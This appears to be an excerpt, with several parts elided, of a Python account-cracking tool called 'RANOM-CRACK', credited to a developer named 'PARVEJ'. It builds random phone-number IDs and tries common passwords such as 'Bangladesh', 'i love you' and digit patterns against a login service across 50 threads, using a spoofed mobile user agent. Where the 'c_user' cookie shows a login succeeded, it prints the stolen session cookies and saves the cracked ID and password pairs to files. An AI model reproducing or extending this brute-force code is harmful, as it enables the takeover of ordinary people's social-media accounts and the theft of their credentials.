...
print('\n\033[1;37m install modules....\n It will take some seconds...PARVEJ   W8 update Tool..')
#os.system
...
def banner():
    clear()
    print(f"""
   \033[32;1m  ____  ___    ____ _    ________    __
   \033[33;1m / __ \/   |  / __ \ |  / / ____/   / /
  \033[31;1m / /_/ / /| | / /_/ / | / / __/ __  / / 
 \033[34;1m / ____/ ___ |/ _, _/| |/ / /___/ /_/ /  
\033[32;1m /_/   /_/  |_/_/ |_| |___/_____/\____/   
             
\x1b[38;5;46m______________________________________________________

 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m DEVELOPER : 🔥PARVEJ🔥
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m FACEBOOK  :   FH Roman
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m TOOLS     :   RANOM-CRACK
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m VERSION   :  \033[1;31m V=[0.2]
...
def random_apk():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : PARVEJ-RNDM-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : PARVEJ-RNDM-CP.txt  ")
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','বাংলাদেশ','bangla','free fire','@@@###','@#@#@#']
...
def random_number3():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','বাংলাদেশ','banga','free fire','@@@###','@#@#@#']
...
def apk(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/PARVEJ-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
        ...
        loop+=1
        sys.stdout.write(f'\r\033[m[PARVEJ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}PARVEJ{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
...
def mix(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/PARVEJ-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [PARVEJ>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/PARVEJ-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
